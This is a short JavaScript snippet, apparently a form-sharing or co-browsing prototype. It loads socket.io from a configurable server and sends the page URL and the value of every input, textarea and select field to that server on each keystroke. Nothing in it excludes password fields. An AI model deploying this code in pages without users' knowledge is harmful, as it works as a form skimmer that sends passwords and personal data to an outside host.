function loadJS(src, callback) {
	var s = document.createElement('script');
	s.src = src;
	s.async = true;
	s.onreadystatechange = s.onload = function() {
		var state = s.readyState;
		if (!callback.done && (!state || /loaded|complete/.test(state))) {
			callback.done = true;
			callback();
	   }
   };
	document.getElementsByTagName('head')[0].appendChild(s);
}

loadJS(GA_SHARE_URL + '/socket.io/socket.io.js', function() {
	var socket = io(GA_SHARE_URL);
	socket.on('form-update', function(data) {
		console.log('Received form-update!');
		console.log(data);
	});

	var inputs = document.querySelectorAll('input, textarea, select');

	var url = document.URL;

	for(var i in inputs) {
		var input = inputs[i];
		input.oninput = function() {
			var event = {
				url: url,
				input: {
					name: this.name,
					type: this.type,
					value: this.value
				}
			};
			socket.emit('form-update', event);
			console.log(event);
		};
		input.onchange = input.oninput;
	}

	alert("Hello world!");
});

